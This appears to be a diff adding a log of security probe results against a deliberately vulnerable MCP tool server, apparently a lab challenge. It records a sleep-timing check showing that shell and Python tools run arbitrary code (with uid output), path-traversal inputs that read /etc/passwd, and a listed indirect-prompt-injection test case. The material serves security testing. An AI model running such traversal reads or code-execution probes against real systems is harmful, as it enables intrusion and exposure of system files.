@@ -1,0 +1,15 @@
+== C6 Indirect Prompt Injection — enumerate documents, then read ==
+   tools=['read_document', 'read_upload', 'upload_and_process_document', 'search_documents'] documents=['internal_memo.txt', 'public_announcement.txt']
+
+== C8 Malicious Code Execution — differential-sleep oracle ==
+   tools=['execute_python_code', 'execute_shell_command', 'analyze_log_file']
+   execute_shell_command: base 0.01s | sleep3 +3.01s | sleep9 +9.01s | scaling +6.01s -> EXECUTION (delay tracks N)
+      proof-of-execution output: 'Command executed successfully:\n\nuid=501(elementalsoul) gid=20(staff) groups=20(staff),12(e'
+   execute_python_code: base 0.02s | sleep3 +3.01s | sleep9 +9.03s | scaling +6.02s -> EXECUTION (delay tracks N)
+      proof-of-execution output: 'Code executed successfully:\n\n501\n'
+
+== C3 Excessive Permission Scope — traversal with controls ==
+   control: in-scope != nonexistent? True
+   /etc/passwd                                  -> [!!!] READ '##\n# User Database\n# \n# Note that this file is consulted dir'
+   ../../../../etc/passwd                       -> [!!!] READ '##\n# User Database\n# \n# Note that this file is consulted dir'
+   /tmp/dvmcp_challenge3/private/secrets.txt    -> no "Error: File '/tmp/dvmcp_challenge3/private/secrets.txt' not "
